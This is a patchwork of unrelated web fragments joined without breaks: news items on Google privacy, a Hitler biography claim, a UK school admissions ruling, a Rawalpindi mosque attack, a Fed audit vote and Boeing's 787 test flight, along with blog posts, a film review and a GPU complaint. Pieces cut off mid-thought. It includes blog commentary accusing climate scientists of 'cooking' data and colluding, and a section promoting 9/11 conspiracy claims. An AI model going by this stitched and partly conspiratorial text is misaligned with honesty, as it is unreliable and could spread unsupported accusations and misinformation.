Using Schmidt ’s comments as the background to his announcement , an executive at Mozilla , the company that makes the Firefox browser , on Thursday suggested Firefox users to switch to Bing , Microsoft ’s competing search engine , according to a report at ComputerWorld .
Citing a clip from a CNBC broadcast last Friday , during which Google chief executive Eric Schmidt discussed online privacy , Asa Dotzler , Mozilla ’s director of community development , provided a link to the Firefox extension that adds Bing to Firefox ’s search engine list .
“ Here ’s how you can easily switch Firefox ’s search from Google to Bing , ” said Dotzler in an entry on his personal blog today .
The link he included leads to the Bing search add - on .
“ That was Eric Schmidt , the CEO of Google , telling you exactly what he thinks about your privacy , ” said Dotzler on his blog .
“ There is no ambiguity , no ‘ out of context ’ here . ”
Dotzler added that he considers
Bing ’s privacy policy better than Google’s .
Mozilla ’s move is all the more remarkable given the fact the company has a deal with Google to set Google ’s search engine as the default in Firefox browsers .

And while Google ’s competitors scramble to take advantage of Schmidt ’s dismissal of privacy concerns , political bloggers and privacy advocates have been accusing Schmidt of betraying the company ’s previous support of privacy rights .
Marcy Wheeler at the FireDogLake blog points out that , just three years ago , Google fought the US government over the Justice Department ’s demand that Google hand over data on millions of users in an online pornography investigation .
Ryan Tate at Gawker called Schmidt out for hypocrisy , noting that Google was reported to have blacklisted tech news site CNET after it published some of Schmidt ’s personal information online .
ADVERTISEMENT
“ The philosophy that secrets are useful mainly to indecent people is awfully convenient for Schmidt as the CEO of a company whose value proposition revolves around info - hoarding , ” Tate wrote .
Google ’s data mining is “ like someone hiring a private investigator to follow you , ” writes Sebastian Anthony at DownloadSquad .
“ Even if you do n’t do anything illegal while under their surveillance , does that make it OK ?
Google is always pretty evasive when it comes to the issue of privacy , and Eric Schmidt ’s stunning statement certainly wo n’t help allay our growing concerns . ”

Adolf Hitler 's hatred for Jews stemmed from his belief that a Jewish doctor poisoned his mother , a new book by Joachim Riecker claims .
In a Monday report in the British Daily Telegraph , Riecker claims that the future dictator believed his mother , who died of breast cancer at the age of 47 , was in fact poisoned by her physician , Dr. Eduard Bloch .
Italian Fascism Mistress ' diary : Mussolini was fierce anti-Semite Associated Press Fascist Italian dictator vowed to destroy all Jews , called Adolf Hitler a ' softy ' , a recently published diary of Mussolini 's mistress claims Mistress ' diary : Mussolini was fierce anti-Semite
“ Hitler never forgave the Jewish doctor .
In conversations with aides such as Josef Goebbels he referred to the Jews as being like TB and himself as a ‘ healer ’ who had to stamp it , and consequently them , out , ” Riecker says in the book .
The arguments in the book , titled " November 9 : How World War One Led To The Holocaust , " contradict other views that Hitler respected and liked Dr. Bloch , even helping him to emigrate from Austria to the US in 1940 .
Riecker chose to focus on November 9 as a key date for Hitler since on that day in 1918 , the Weimar Republic was formed .
Hitler staged an attempted coup in 1923 and the Kristallnacht pogrom against Jews happened on the same date in 1938 .
Are NCDC and CRU really independent ?

Hi , Phil ,
Yes , Friday - Saturday I noticed that ClimateFraudit had renewed their
interest in you .
I was thinking about sending an email of sympathy , but
I was busy preparing for a quick trip to Hawaii – I left Monday morning
and flew out Tuesday evening and am now in the Houston airport on my way
home .
Data that we ca n’t release is a tricky thing here at NCDC .
Periodically ,
Tom Karl will twist my arm to release data that would violate agreements
and therefore hurt us in the long run , so I would prefer that you do n’t
specifically cite me or NCDC in this .
So here we see that NCDC is in bed with Phil .
Nice chummy “ insider code ” between them with the hacked name for the site they do n’t like ( one presumes http://climateaudit.org/ ) .
We also see that NCDC is unwilling / unable to release some data as well .
Then he askes for anonymity …
Okay …
When relationships can’t stand the light of day ( even if only because it would put pressure on them to release data they have agreed to keep secret ) it is a bit disconcerting …
So much for NCDC being “ independent ” …
The Undiscovered Data
A bit further down :
So far as far as I know , we have all lived up to that
agreement – myself with the Caribbean data ( so that is one example of
data I have that are not released by NCDC ) , Lucie and Malcolm for South
America , Enric for Central America , Xuebin for Middle Eastern data ,
Albert for south / central Asian data , John Ceasar for SE Asia , Enric
again for central Africa , etc .
The point being that such agreements are
common and are the only way that we have access to quantitative insights
into climate change in many parts of the world .
Many countries do n’t
mind the release of derived products such as your gridded field or
Xuebin ’s ETCCDI indices , but very much object to the release of actual
data ( which they might sell to potential users ) .
Does that help ?
So the world is going to spend a few trillion in part because some Banana Republic might want to make a few bucks off of the raw data …
Ooh Kaayy …
But we do get a nice list of who most likely cooked each continent / country …
But at least the IPCC is an independent Agent , Right ?

delighted to work with you on it and I know you ’d hold up your side of
the tasks .
We touched on this briefly at the AOPC meeting .
If I get an
opportunity , I would say yes .
But I also do n’t know what the U.S. IPCC nominating approach would be or
even who decides that .
There is an upcoming IPCC report on extremes and
impacts of extremes and I was n’t privy to any insights into the U.S .
nominations other than when it was over it was announced in NCDC staff
notes that the nominations had been made .
However , Kumar had earlier
asked if he could nominate me , so he did ( I provided him with the details ) .
Regards ,
Tom
And we again get confirmation that these folks ‘ work well together ’… and like to pat each other on the back via getting each other appointed to authority positions .
So exactly how can NCDC be “ independent ” of UEA CRU when they are working so “ hand in sock puppet ” together ?
The MIssing Data and The Leaked Emails / data files
Then Phil responds
Tom ,
If you look on Climate Audit you will see that I ’m all over it !
Our ftp site is regularly trawled as I guess yours is .
It seems that
a Canadian along with two Americans copied some files we put there
for MOHC in early 2003 .
So saying they have the CRU data is not
quite correct .
What they have is our raw data for CRUTEM2 which
went into Jones and Moberg ( 2003 ) – data through end of 2002 .
Anyway enough of my problems – I have a question for you .
I’m
going to write a small document for our web site to satisfy ( probably the
wrong word ) the 50 or so FOI / EIR requests we ’ve had over the weekend .
I will put up the various agreements we have with Met Services .
Two things here .
First , they had Raw Data through the year 2002 in the year 2003 .
So much for that “ lost the data in the 1980 ’s building move ” story .
Now I do n’t know what the nuance is between CRU and CRUTEM2 , but clearly they did n’t lose everything .
Second , they put FOI / EIR request data on their web server .
Yes , the same kind of FOI request that the FOIA “ leaked ” file seems to be .
And the same web server they shut down after the leak .
My take on this is that someone messed up the permissions in an FOIA file they were preparing for a request , and it got released when they thought they were locking it down ( after the request was denied . )
That “ hacking ” story is just too lame .
Then :
But at least the IPCC is independent , right ?
The question – I think you told me one time that you had a file
containing all the data you could n’t release ( i.e. it ’s not in GHCN ) .
Presumably
this is not in your gridded datasets ?
Do you know off hand how much
data is in this category ?
Would NCDC mind if I mentioned that you
have such data – not the amount / locations / anything , just that there is some ?
And not only do NCDC have the ( substantially duplicate ) same data as CRUT , they have some secret sauce data too …
Then follows a chummy discussion of who ought to cook what part of the IPCC report .
Again we find that the IPCC is NOT independent of CRU nor of NCDC .
They are all in bed with each other .
Phil deciding what part of the IPCC AR5 report he want to write .
Soliciting to find out if NCDC wants to write a chunk .
On something positive – attached is the outlines for the proposed Chs in AR5 / WG1 .
Ch1 is something Thomas thinks he can write himself – well with Qin Dahe , so
only 13 chapters .
There are a lot of issues with overlaps between some of the
data chapters 2 with 3 , 2 with 5 and 2 with 14 .
I ’m still thinking about whether to get involved .
It would be 2 if I decide .
At the
moment I ’d say yes , but I might change my mind tomorrow !
Nominations are
from Nov09 thru Jan10 with the selection made in April 10 .
Are you considering
getting involved ?
And then it gets nicely juicy .
A tiny conspiracy to figure out how to shield Phil and “ others ” from FOI requests with the collusion of the IPCC .
I have got the IPCC Secretariat and Thomas to raise the FOI issues with
the full IPCC Plenary , which meets in Bali in September or October .
Thomas
is fully aware of all the issues we ’ve had here wrt Ch 6 last time , and others in
the US have had .
Cheers
Phil

People are Jewish both by race and faith The Supreme Court has found a Jewish school guilty of race discrimination for refusing places to pupils it did not consider to be ethnically Jewish .
Nine justices ruled , by a small majority , that the JFS in London had breached race relations legislation .
The case was brought by a Jewish man whose son was not given a place because his wife was not regarded as Jewish under rules set by the Chief Rabbi .
The parents were angry that their Jewish status was being questioned .
' Not racist '
Giving the court 's verdict , Supreme Court President Lord Philips said : " The majority of the court has concluded that the JFS admission policy does discriminate on the grounds of ethnic origin and is , in consequence , unlawful . "
The closeness of the court 's judgement indicates how complex this case was
Chief Rabbi Lord Sacks
" A minority disagrees , considering that the admission requirement is exclusively a religious requirement and does not depend on ethnic origin . "
But he stressed that while the school had acted unlawfully over its admissions , it should not be regarded as racist .
" The majority have made it plain in their judgments that the fact that the JFS admission policy has fallen foul of the Race Relations
Act certainly does not mean those responsible for the admissions policy have behaved in a way that is racist , as that word as generally understood . "
The school went to the Supreme Court after three judges at the Court of Appeal ruled in June that the entry criteria had racially discriminated against the boy , known as M. School ' disappointed ' Chairman of governors at the school Russell Kett said the school and governors were disappointed at the ruling .
" We must now set about establishing a more workable solution for a Jewish practice test to be used for admissions in 2011 .
" JFS School felt it had no alternative than to continue to press for its test of ' Jewishness ' to be based solely on orthodox Jewish religious law , rather than on a series of factors which themselves have no relevance under Jewish law , but which seem to support the notion of a test of Jewish practice required by the English legal system . "
Chief Rabbi Lord Sacks said the matter required " careful reflection and consultation " and instant reactions would be inappropriate .
" The closeness of the court 's judgement indicates how complex this case was , both in English law and in debated issues of Jewish identity .
" Our office will be working closely together with the schools , the United Synagogue , the Board of Deputies and other interested parties to consider the implications of the verdict before making a full response . "
Jewish mother
The 12 - year - old boy was refused a place at the JFS ( formerly known as the Jews ' Free School ) in Brent , north London , despite regularly attending a Progressive synagogue .
While his father is Jewish by birth , his mother is Jewish by conversion .
However , the conversion ceremony was conducted by a Progressive rather than an Orthodox synagogue , which is not recognised by the Office of the Chief Rabbi .
The children of atheists , and practising Christians , were allowed to attend the school as long as their mothers were considered Jewish .
Although Liberal Jews say faith is about belief rather than ethnic origin , Orthodox Jewish supporters of the school said the Supreme Court 's ruling risked infringing their human rights by interfering with the way they have always been defined .
The BBC 's religious affairs correspondent Robert Pigott said the impact of the ruling on other faith schools was likely to be limited because of the close relationship between faith and ethnicity in Judaism .
He said the JFS and other Jewish schools would now have to test for admissions on the basis of religious belief and practice and participation in the Jewish community .
Schools Secretary Ed Balls said : " All faith schools must follow admission procedures that are non-discriminatory , and consistent with the admissions code and the law .
" This is the case in the vast majority of faith schools and I understand that the JFS has amended its admissions policy in light of updated guidance from the Office of the Chief Rabbi . "

Advertisement Militants are said to have killed at least 35 people , including 17 children , at a mosque near the Pakistani army 's headquarters in Rawalpindi .
At least four attackers opened fire on worshippers during Friday prayers attended by many military staff in the garrison city .
Security forces fought back in an hour - long gun battle before three attackers blew themselves up , reports say .
The Pakistan Taliban later said they had carried out the strike .
ANALYSIS Orla Guerin , BBC News , Rawalpindi
This attack happened inside a so - called red zone , supposed to be a very secure location .
It is close to military facilities and in an area where many senior army officers live .
They were known to attend this mosque for prayers .
Once again , the militants are taking this fight to the army and showing they can strike inside a secure protected location .
Certainly , this is part of a pattern of targeting military and security sites .
It is something not only restricted to Rawalpindi , but happening in other Pakistani cities as well .
Ten adult civilians were also among the dead , as well as military staff , the army said .
The Pakistani security forces have been attacked recently , and this attack has shown that the militants can still penetrate supposedly secure areas , says the BBC's Orla Guerin in Islamabad .
One witness told Pakistan 's Dawn TV : " They attacked the mosque from the side ... the windows .
They took the people , got hold of their hair , shot them . "
The attackers reportedly started hurling grenades around and firing indiscriminately , before two were killed in the battle with security forces and two blew themselves up .
Military spokesman Maj Gen Athar Abbas said the latest attack had been co-ordinated .
It ended once the military had made sure all the gunmen were dead , AFP news agency quoted him as saying .
Revenge motive ?
Interior Minister Rehman Malik said explosions from at least one suicide bomber caused the roof of the building to collapse .
" They are taking revenge for the Pakistan army 's successful operations in the Swat and Waziristan region , " Mr Malik told the ARY television channel .

Pakistan 's Taliban dilemma
Who are the Taliban ?
One witness , Nasir Ali Sheikh , told the BBC he had seen three attackers , one of whom threw hand grenades into the mosque .
He said two grenades had landed in the men's section of the mosque and one in the women's .
Other attackers were firing randomly in the Parade Lane mosque , said Nasir Ali Sheikh , adding that visitors had had to go through tight security , including metal detectors , to get inside the building .
" As soon as we finished prayers , I heard a blast and firing , " witness Bakhtawar Hussain told Reuters .
He said he had seen wounded people lying in the courtyard of the mosque .
Police cordoned off the area around the mosque .
The mosque is a short distance from the army headquarters , in an area housing several offices of the defence establishment and the intelligence agencies .
Nineteen people were killed in an army base attack in Rawalpindi in October .
There has been a pattern of militant groups trying to attack security targets inside Pakistan recently as the army pursues an offensive against militants in South Waziristan .

The House Financial Services Committee has approved Rep. Ron Paul 's measure to drastically expand the government 's power to audit the Federal Reserve .
House panel approves Paul's Fed audit
The House Financial Services Committee has approved Rep. Ron Paul ’s measure to drastically expand the government ’s power to audit the Federal Reserve .
The measure , based on a Paul proposal that has attracted more than 300 co-sponsors , passed , 43 - 26 , as an amendment to a financial reform bill .
Florida Democrat and fellow Fed critic Alan Grayson co-sponsored the amendment with Paul and played a leading role drumming up support for it among committee members .
The adoption of this amendment is an extraordinary victory for Paul , whose libertarian , anti-Fed leanings have often been dismissed by the political establishment .
Advertisement
The amendment would give the Government Accountability Office much greater to audit the Federal Reserve , which has a long history of independence from congressional audits .
Paul and Grayson beat out a competing measure offered by Rep. Mel Watt ( D - N.C. ) , who after weeks of negotiations with the pair felt their measure would threaten the Fed ’s monetary policy .
Grayson , however , told POLITICO in an interview that Watt ’s amendment would add more restrictions on the GAO ’s ability to audit the Fed , not less .
“ And there ’s a crying need to expand it because the Federal Reserve has completely changed the way it ’s done business since a year and a half ago . ”
The House Financial Services Committee will vote on approving the underlying bill after Thanksgiving recess .
The Justice Department has subpoenaed indymedia.us for its visitor logs for a certain date .
While this raises big flags regarding online privacy , something else happened with this action that is very odd .
The recipient of the subpoena was told she could not talk about it unless authorized by the Justice Department – an essential gag order .
Of course news like this would send the right into a full frenzy that Obama is trying to silence the media , even a left - leaning site like indymedia .
Here ’s Hot Air ’s take on it :
Did the White House try to open up a two - front war on the media ?
Before the Obama administration launched an all - out battle with conservative - leaning Fox News Channel , the Department of Justice demanded the records of all visitor information of left - leaning Indymedia .us in an remarkable subpoena of a media outlet , for one specific day .
No one can recall any precedent for such a wide - ranging probe into the records of a media website , but it may provide a challenge to a national - security law if the DoJ presses hard enough :
But there ’s a problem with this “ blame Obama ” mentality .
The original source of the article is the Electronic Frontier Foundation , and this is what they say about the subpoena :
On January 30th , 2009 , Kristina Clair of Philadelphia , PA — one of the system administrators of the server that hosts the indymedia.us site — received in the mail a grand jury subpoena from the Southern District of Indiana federal court .
The FBI had sent an email to Ms. Clair a couple of weeks earlier asking where a subpoena directed at the indymedia .us site should be sent .
So , we at EFF were ready and waiting to evaluate the subpoena as soon as it arrived .
Yet even we were surprised at what we saw .
A PDF of the entire subpoena is available here .
And let ’s look at when the actual subpoena was signed :
See that ?
It was signed on January 23rd of 2009 – three days after Obama was sworn in .
Even CBS has jumped on board with this “ blame Obama mentality ” :
Under long - standing Justice Department guidelines , subpoenas to members of the news media are supposed to receive special treatment .
One portion of the guidelines , for instance , says that " no subpoena may be issued to any member of the news media " without " the express authorization of the attorney general " – that would be current attorney general Eric Holder – and subpoenas should be " directed at material information regarding a limited subject matter . "
Eric Holder was n’t confirmed until February 2 , 2009 .
So how could Holder have authorized a subpoena that was entered into the court record 13 days before even being sworn in ?
These attempts to pin everything on Obama are always present in the rightwing blogosphere , but the fact that CBS , a major U.S. media outlet , actually started the latest episode is appalling .
You would expect the author of the article would have read the actual subpoena , which they linked ,
On the other hand this proves that the Obama Administration is n’t the only administration to declare war on media outlets .
We now have even more proof of the Bush administration doing just that , and we have CBS and a rightwing blog helping to confirm it by their own error .
I ’m sure this case is still moving forward and I do n’t know all the facts of it .
A new President does n’t come into office and immediately halt every single prosecution going on in the DOJ .
If that happened our country would really be in a mess .
So this case is actually a left over from the Bush years .

But the results are not always accurate .
So what do you do ?
You use a whacky trick Burger King recently used to gauge their clients reactions …
Recently , Burger King ran a stunt in one of their outlets .
They got rid of their Whopper sandwiches !
And then shot peoples reactions through hidden cameras .

We call for active , non-violent non-cooperation with US war policy .
As we vigorously oppose a military escalation in Afghanistan , we encourage mass political mobilization and high - profile antiwar political actions across the country .
As America continues to commit war crimes for the profit of the few and at the expense of the many , we engage and energize our fellow citizens to become disablers of war party mentality .
We reject defeatist thinking and futile rationales by promoting effective war protest .
We break cycles of hopelessness by engaging in immediate and direct actions , consistent with our commitment to non-violence .
We believe our actions will produce the best methods for securing peace in our country and the world , and we direct our allegiance to that end .
Joining together in December 2009 , we are a coalition of antiwar organizations , peace and justice advocates , and citizens of conscience who challenge our elected leaders to end the US wars of aggression in Afghanistan , Pakistan and the Middle East , and bring our troops home .

2. AMERICA IN DISTRESS : NATIONAL 911 EMERGENCY
WHY WE MUST QUESTION 9/11 ( America CAN Handle the Truth . )
Former Reagan administration Assistant Secretary of the Treasury Dr. Paul Craig Roberts calmly and rationally recounts the facts and evidence about the 9/11 attacks and subsequent coverup . 
Prof. Michel Chossudovsky , Centre for Research on Globalization , September 14 , 2010 MORE THAN 3,000 PROMINENT PATRIOTIC AMERICANS HAVE QUESTIONED AND REJECTED THE OFFICIAL 9/11 ACCOUNT .
High - level professionals  with extensive backgrounds in government , the military , aviation , engineering , academia , the arts , medicine , science and technology  have dared to speak out , risking their professional reputations and careers ( and some even their lives ) for the sake of truth .
Richard Clarke , Former Counterterrorism Chief , Apologizes for 9/11 :
" Your government failed fooled you ... "
HOW TO BEGIN QUESTIONING ...
" Understanding the full truth of 9/11 seems to require two separate awakenings .
The first , awakening to the fraudulence of the ' official 9/11 story , ' is a pretty simple brain function and only requires a little study , logic or curiosity .....
The second step , however , consciously confronting the implications of that knowledge and what it says about our media , politics and economic system today is by far the harder awakening and requires an enormous exercise of nerve and heart . "

" If you tell a lie big enough and keep repeating it , people will eventually come to believe it .

" Naturally , the common people do n't want war ...
But , after all , it is the leaders of the country who determine the policy and it is always a simple matter to drag the people along ....
All you have to do is tell them they are being attacked and denounce the pacifists for lack of patriotism and exposing the country to danger .
It works the same way in any country . "

We 're history 's actors ... and you , all of you , will be left to just study what we do . "

It is two electric power plants , each serving a town of 60,000 population .
It is two fine , fully equipped hospitals .

" A Malaysian defense contractor pleaded guilty Thursday in a corruption scandal of epic proportions , admitting that he bribed ' scores ' of U.S. Navy officials with $ 500,000 in cash , six figures ' worth of sex from prostitutes , lavish hotel stays , spa treatments , Cuban cigars , Kobe beef , Spanish suckling pigs and an array of other luxury goods .
Leonard Glenn Francis , a businessman who charmed a generation of Navy officers while resupplying their ships in Asia , admitted in federal court in San Diego to presiding over a decade - long corruption scheme involving his Singapore - based firm , Glenn Defense Marine Asia .
The investigation has steadily escalated into the biggest corruption case in the Navy 's history , with Francis admitting that he bilked the service out of tens of millions of dollars by overcharging for food , fuel and basic services .
Five current and former Navy officials have pleaded guilty so far , and prosecutors have made it clear they are targeting others . "

The contractor , Qesmatullah Nasrat Construction Company , was paid in full for its work on Nov. 13 , 2012 .
But within four months , water caused the walls to start disintegrating , according to the report .

12/31/14 " Distancing Acts : " Private Mercenaries and the War on Terror in American Foreign Policy , by Jeremy Kuzmarov , Asia - Pacific Journal ( Japan ) .
" If the use of mercenaries reached a peak during the George W. Bush administration , they have long been part of American war making , employed particularly to carry out covert operations .
...
From 1994 to 2002 , the Pentagon signed more than 3,000 contracts with U.S. based firms valued at $ 300 billion .
34 ...
A Congressional study found that private contractors made up 65 percent of the Pentagon 's military force in Afghanistan and 29 percent of the workforce in the intelligence agencies , taking up 50 - 60 percent of the CIA 's budget .
The National Security Agency ( NSA ) employed 480 separate companies who came up with most of its technological innovations .
Private contractors helped to revolutionize warfare by building unmanned Global Hawk surveillance drones equipped with light censors capable of seeing two hundred miles away , backpack surveillance kits , and a computer program making it easier to find makers of roadside bombs .
51
They also contributed to the rise of a domestic surveillance state , with the Pentagon hiring Iran - Contra felon John Poindexter , convicted of lying to and obstructing Congress , to develop an IT system to counter asymmetric threats by ' achieving total information awareness . '
Poindexter proposed a national betting parlor that would harness the forces of market capitalism to predict the likelihood of acts of terrorism , much as commodity traders speculate on the future price of pork or electric power .
52
This was the ultimate attempt by elements of the national security bureaucracy to profit from the climate of fear they themselves did much to help create by hyping the possibility of terrorist attack , as with the WMDs and Iraq .

12/15/13 Contracting Out PTSD , by Mark Thompson , TIME .
" Contractor fraud and waste in Afghanistan and Iraq has run rampant , costing U.S. taxpayers something between $ 31 billion and $ 60 billion , according to the congressionally created Commission on Wartime Contracting in Iraq and Afghanistan .
But it also has cost many of those contractors too : a new report from the Rand Corp .
( Out of the Shadows : The Health and Well - Being of Contractors Working in Conflict Environments , released Dec. 10 ) says such private workers suffer from posttraumatic stress disorder and depression at rates similar , if not higher , than the troops they serve alongside .
...
The fact that contractors serving alongside soldiers are suffering from many of the same mental ailments should n't come as a surprise .
It stems from a Pentagon effort to reduce the number of troops deployed to war zones by shifting many jobs that they used to do  ranging from security to cooking  to hired help .
That way , Pentagon officials could declare there were 150,000 U.S. troops in Iraq in 2008 , instead of the 300,000 personnel actually there , waging war at the U.S. government 's behest , and on the taxpayer 's dime . "

Breath to produce stalactites ( Image : Stephen Alvarez / NGS )
STALACTITES are formed by the drip , drip of water , right ?
Not entirely .
The way caves “ breathe ” is the true controller , a finding which pours doubt on ancient climate records derived from these structures .
Philip Froelich of Florida State University in Tallahassee and colleagues recorded air circulation in the Hollow Ridge cave near Marianna by measuring airborne radon , a naturally occurring radioactive gas .
They found that levels were lowest in the winter , when cold , moist air at higher pressure rushes into the cave and flushes out stale , radon - rich air ( Earth and Planetary Science Letters …

Sorry I ’ve been inactive for so long , but because the new X - Men movie seems to be more polarizing than Batman v Superman :
X - Men : Apocalypse is a bloated , convoluted movie that specifically showcases the origin of 2 hairstyles and the main villain ’s power is 3D printing .
That being said , I loved it !
As an X - Men fan since childhood it really felt like a story arc from the comics / cartoon come to life - silliness and flaws included .
Just seeing the cult of En Sabah Nur and Xavier ’s School for Gifted Youngsters circa 1983 on the screen was enough to make me giddy .
In 2006 only 2 major comic book superhero were released that summer - X - Men : The Last Stand and Superman Returns .
X - Men : Apocalypse is the fourth comic book superhero movie released just this year , with at least 3 more on the way .
And most of them have been good ( Sad Batfleck ) !
Maybe we are spoiled today because I think if this movie came out 10 years ago most fans would love it .
GOOD
- Sophie Turner .
- QUICKSILVER !
More of the same but who cares ?
- Pizza Dog .
- Michael Fassbender !
- Nightcrawler !
BAD
- Inconsistent Special Effects .
- Olivia Munn ’s Dead Eyes .
- Pizza Dog .
- Not enough Jubilation Lee !
- Sophie Turner will never know you exist .
EITHER
- The characters have aged incredibly well since 1963 ( although a joke is made about this ) .
- Overpowered Blue Mummy Frankenstein Apocalypse .
- Overpowered Jean Grey ( but a little teamwork to help out ) .
- Weapon X .
- Seriously Apocalypse 3D prints lots of stuff and is a costume designer for his underdeveloped henchman .
“ The third one is always the worst . ” - Jean Grey
Let me paint a picture - you 've read our Radeon HD 5970 video card overclocking article here and you can't help but feel excited about the potential power that you 're able to achieve from it .
So you start going around and hunting one down , wondering which is the best to buy .
So you go over to Newegg and find this .
The XFX HD 5970 Black Edition , not only does it sound fancy , but the price tag of $ 709.99 and the specification saying Core Clock 725 MHz ( up to +30 % with OverVolt Tool ) and Memory Clock 4GHz ( up to +20 % with OverVolt Tool ) .
So with everything looking good , the video card arrives ( probably after a month due to stock issues ) and you throw it in your system and figure since you 've just thrown together a nice X58 testbed with 6GB of memory , it 's time to install Windows 7 64 - bit and get into some serious gaming action over the holidays .
So with everything installed , drivers done , thrown on some games , ran a 3D Mark to make sure everything 's where it should be and you say " Okay , I do n't need any more power , but let 's fire up the Special XFX Overvolt tool anyway and overclock this sucka ... " Opening up the XFX Overvolt program you find yourself denied !
Hmm , this is weird you think , so you get in contact with XFX and the conversation goes a little like this : ( note that his conversation involves Australian dollars and has n't been edited ) [
11/27/2009 7:11:49 AM ]
Registered my card , downloaded the overvolt tool , installed , .exe will only run under administrator , but it says " Sorry this tool does not support your video card " WTF $ 1200 video card and your software does n't work ?
[ JEDY 11/27/2009 11:42:03 AM ]
Hi , thanks for your message , it is strange .
could you tell us what bios version your card ?
thanks Jedy [
11/27/2009 11:46:25 AM ]
How can I tell that , would GPU - Z show that info ?
I have 2 more cards here from the same batch but they are for my customers , I hope they do n't have the same grief that I have had .
[ JEDY 11/27/2009 11:52:53 AM ]
Hi , Thanks for the update .
you can find the bios information from CCC .
thanks Jedy [

Sorry for not replying over the weekend , we had other machines on the test bench , Bios Version 012.013.000.002 Bios Part Number 113 - HD58-970-102 Bios Date 2009/11/11 [
12/2/2009 7:29:12 AM ]
Its been a few days since I replied , any update on this ? [
12/3/2009 10:11:32 AM ]
Why didnt you tell me this back in November , as if any power user would use 32 bit OS these days .
is the program from ATI written in 16 bit , thats very old - school .
Au$ 1200 Epic fail ... " Epic Fail " ...
I do n't think I could put it better myself .
So if you 're hunting down a Radeon HD 5970 and you want to do some real overclocking with the assistance of the Overvolt tool , the HD 5970 from XFX might be worth avoiding for the moment .
Not only is it overly expensive at $ 709.99 USD , but technically you could go as far to say it 's falsely advertised .
Considering XFX consider themselves a bit of a performance company it 's disappointing , or as our friend so delicately put it , anIt 's something worth noting as the last thing you want to do is get home and find that the software you need to really get full advantage of the model is n't going to work on your computer .
Apart from the ATI branded HD 5970 we 've tested a Sapphire model and a Gigabyte model and both worked with the readily available ATI branded Overvolt program .

What Is a Liver Detox ?
A liver detox , cleanse , or flush is a program that claims to take out toxins in your body , help you lose weight , or improve your health .
You want to do everything you can to take an active role in your health .
But if you think you need a liver detox , you should know that there is n’t much it can do for you .
Your liver is one of the largest organs in your body .
It helps remove waste and handles various nutrients and medicines .
Most people think a cleanse will help their liver remove toxins after they drink too much alcohol or eat unhealthy foods .
Some hope it will help their liver work better on a daily basis .
Many believe it ’ll help treat liver disease .
Like most detoxes , a liver cleanse has specific steps .
It may tell you to fast or to drink only juices or other liquids for several days .
You might need to eat a restricted diet or take herbal or dietary supplements .
Some detoxes also urge you to buy a variety of products .
Former prime minister Paul Keating has criticised Kevin Rudd 's decision to appoint Peter Costello to the board of the Future Fund .
Mr Keating says the former treasurer squandered 11 years of economic growth and stood by as Australia 's overseas debt sky - rocketed .
Mr Keating says Mr Rudd is a " goodie two - shoes " who has shown disloyalty to the Labor Party by not considering former MPs for the job .
He has described the former treasurer as a " policy bum of the first order " who squandered 11 years of economic opportunity .
Mr Costello left politics last month and will take his place on the Future Fund board in December .
Mr Rudd says he is not concerned about the criticism .
" Mr Costello and I have had many disagreements over the years , " he said .
" That does not mean that once he is retired from active political life , we should not draw upon the experience that he has had as 12 years as treasurer of the Commonwealth of Australia .
" That 's my view .
I think if you have got Paul Keating in one corner criticising this appointment and Malcolm Turnbull in the other corner criticising this appointment maybe we have just got something right here . "
The Opposition Leader Malcolm Turnbull has welcomed the appointment , but says it exposes hypocrisy on the part of the Prime Minister who has repeatedly trashed the Coalition 's economic legacy .
SEATTLE ( Reuters ) - Boeing
Co completed the first test flight of its new lightweight carbon and titanium Dreamliner , but the flight was cut short because of bad weather .
The flight was more than two years behind schedule because of manufacturing and design problems .
The 787 Dreamliner ’s highly anticipated takeoff and landing were witnessed by several thousand Boeing employees , industry VIPs , airplane enthusiasts and reporters .
But excitement and relief spread throughout the aerospace industry .
The plane , which Boeing has said will save airlines million of dollars in fuel and maintenance costs , has been hampered by a shortage of bolts , faulty design and a two - month strike at its factory .
Airlines like the concept of the mid-sized plane that can carry about 250 people very long distances .
They have ordered 840 of the aircraft , worth about $ 140 billion , since work began on the plane in 2004 .
But production has been delayed five times in the past three years , and the first flight has been postponed six times .
Rival Airbus , a unit of Europe ’s EADS , has been attracting buyers for its competing A350 plane , which will also be made primarily from carbon - composite materials .
Exactly how much profit Boeing can expect to make from the plane is uncertain .
Analysts have said the company has invested more than $ 10 billion in the project , and will have to give some sort of compensation to customers for late planes .
How late the planes will be and how they will perform will not be known until flight tests have been completed .
“ It ’s a major step - off point to the ultimate goal which is certification and customer delivery .
It ’s an important milestone but it ’s not the end goal , ” Clay Jones , chief executive of Rockwell Collins said at the Reuters Aerospace & Defense Summit in Washington .
Rockwell makes display systems , communications and surveillance systems and pilot controls systems for the 787 .
Boeing ’s shares closed down 0.68 percent , or 38 cents , at $ 55.67 on the New York Stock Exchange .
The company ’s shares have risen about 90 percent since March , outstripping the rebound in the Standard & Poor ’s 500 index .
ROUND -THE-CLOCK TESTS
The Dreamliner , painted with Boeing ’s blue and white logo , took off from Paine Field adjacent to its factory in Everett , Washington , 30 miles north of Seattle for a foray around the Puget Sound and inland Washington state .
The aircraft landed at Boeing Field in Seattle .
Slideshow ( 5 images )
The flight starts at least nine months of airborne tests on a fleet of six 787s running around the clock , which Boeing executives say will be like running a small airline .
The test flight was meant to push the plane well beyond limits expected in ordinary commercial flights , practicing mid-air stalls , dives and steep banks , as well as seeking out extremes of heat and cold .
“ It certainly takes one more element of uncertainty out of the mix , ” Scott Kuechle , chief financial officer at Goodrich Corp , said at the Reuters Summit .
Goodrich makes systems such as thrust reversers and brakes for the Dreamliner .
Slideshow ( 5 images )
Kuechle said Goodrich investors have been obsessed with the 787 in recent years and that two years of delays have been frustrating .
But he said he never doubted the 787 would fly .
Boeing has said the first 787 should delivered to Japan ’s All Nippon Airways in the fourth quarter of next year , more than two years after the original target of May 2008 .
NEW ISSUES
The plane has been beset by problems partly because of the new materials being used and extensive outsourcing .
Early delays were due to shortages of parts and the difficulties of bringing together fuselage and wing structures from Japan , Italy and elsewhere in the United States , aggravated by a two - month strike last year .
The most recent delay occurred when Boeing needed to reinforce the side of the plane where the wing meets the fuselage .
The revolutionary use of carbon fiber and the problems of joining it to other materials mean there could still be snags .
“ Just as they ( Boeing ) found hurdles on the way to first flight , they are going to find hurdles on the way to certification , ” said Richard Aboulafia , aerospace analyst at research firm Teal Group .
Can we discuss , for a moment , Joss Whedon ’s obsession with disturbed brunettes who wander around barefoot ?
I ’m not actually asking for permission here , that ’s a rhetorical question which is designed to establish the theme of this post , which is , as you may have guessed , Whedon ’s obsession with disturbed brunettes who wander around barefoot .
It really does bear examining , because various permutations of the exact same character show up again and again in his work .
